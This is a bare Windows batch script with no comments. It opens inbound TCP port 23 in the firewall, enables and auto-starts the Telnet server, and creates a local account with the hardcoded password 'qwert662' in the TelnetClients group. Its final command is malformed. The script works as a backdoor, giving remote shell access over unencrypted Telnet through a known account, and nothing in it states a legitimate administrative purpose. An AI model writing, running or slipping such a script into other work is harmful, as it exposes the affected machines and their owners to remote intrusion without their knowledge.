@echo off
netsh advfirewall firewall add rule name="Veredito" protocol=TCP dir=in localport=23 action=allow

dism /online /Enable-Feature /FeatureName:TelnetServer

pkgmgr /iu:TelnetServer

sc config TlntSvr  start= auto 

net start telnet 

net user user qwert662 /add

net localgroup TelnetClients user qwert662 /add



